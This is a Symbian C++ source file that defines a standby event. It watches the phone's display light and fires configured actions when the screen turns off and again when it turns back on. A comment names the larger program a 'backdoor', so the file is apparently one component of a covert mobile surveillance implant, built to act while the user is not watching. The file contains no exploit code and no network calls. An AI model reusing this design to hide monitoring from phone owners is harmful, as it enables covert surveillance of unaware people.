/*
 * EventStandby.cpp
 *
 *  Created on: 29/set/2010
 *      Author: Giovanna
 */

//CSaveNotifier

#include "EventStandby.h"
#include <HAL.h>
#include <hal_data.h>
#include <e32std.h>


CEventStandby::CEventStandby(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Standby, aTriggerId)
	{
	// No implementation required
	}

CEventStandby::~CEventStandby()
	{
	__FLOG(_L("Destructor"));
	delete iLight;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventStandby* CEventStandby::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventStandby* self = new (ELeave) CEventStandby(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventStandby* CEventStandby::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventStandby* self = CEventStandby::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventStandby::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventStandby.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	Mem::Copy(&iStandbyParams, iParams.Ptr(), sizeof(iStandbyParams));
	
	}

void CEventStandby::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	// Initialize the display value, 
	iDisplayOff = DisplayOff();
	
	// Triggering the action here could be dangerous, if the action is a sync after a new config
	// the backdoor could panic...
	if(iDisplayOff)
		{
		__FLOG(_L("DisplayOff"));
		SendActionTriggerToCoreL();
		}
	else
		{
		__FLOG(_L("DisplayOn"));
		}
	
	// Start monitoring light status; it's here and not into ConstructL otherwise
	// LightStatusChanged is called before StartEventL()
	iLight = CHWRMLight::NewL(this);

	}

TBool CEventStandby::DisplayOff()
	{
	__FLOG(_L("DisplayOff()"));
	TInt displayState;
	TInt err = KErrNone;
	err = HAL::Get( HALData::EDisplayState, displayState );
	__FLOG_1(_L("displayState = %d"),displayState);
	__FLOG_1(_L("err = %d"),err);
	if((err == KErrNone) && (displayState == 0))
		return ETrue;
	else
		return EFalse;
	}


// this is working on N96
/*
void CEventStandby::LightStatusChanged(TInt aTarget, CHWRMLight::TLightStatus aStatus)
	{
	// monitored light status change should be primary display
	if ((aTarget != CHWRMLight::EPrimaryDisplay) )
		return;
	
	switch(aStatus)
		{
		case CHWRMLight::ELightOff:
			{
			// perform HAL check
			if (DisplayOff())
				{
				// Display off
				// Before trigger the event perform an additional check, just in case.
				if (!iDisplayOff)
					{
					// Triggers the In-Action
					SendActionTriggerToCoreL();
					iDisplayOff = ETrue;
					}
				}
			}
			break;
		case CHWRMLight::ELightOn:
			{
			// perform HAL check
			if(!DisplayOff())
				{
				if(iDisplayOff)
					{
					// Triggers the  action
					if (iStandbyParams.iExitAction != 0xFFFFFFFF)
						{
						SendActionTriggerToCoreL(iStandbyParams.iExitAction);
						}
					iDisplayOff = EFalse;
							
					}
				}
			}
			break;
		default:
			break;
		}
	}
*/


// this is working on E72
void CEventStandby::LightStatusChanged(TInt aTarget, CHWRMLight::TLightStatus aStatus)
	{
	__FLOG(_L("LightStatusChanged()"));
	// perform HAL check
	if (DisplayOff())
		{
		__FLOG(_L("DisplayOff"));
		// Display off
		// Before trigger the event perform an additional check, just in case.
		if (!iDisplayOff)
			{
			__FLOG(_L("TriggerInAction"));
			iDisplayOff = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			}
		}
	else 
		{
		__FLOG(_L("DisplayOn"));
		// Display on
		if(iDisplayOff)
			{
			__FLOG(_L("TriggerExitAction"));
			iDisplayOff = EFalse;
			// Triggers the  action
			if (iStandbyParams.iExitAction != 0xFFFFFFFF)
				{
				SendActionTriggerToCoreL(iStandbyParams.iExitAction);
				}
							
			}
		}
	}


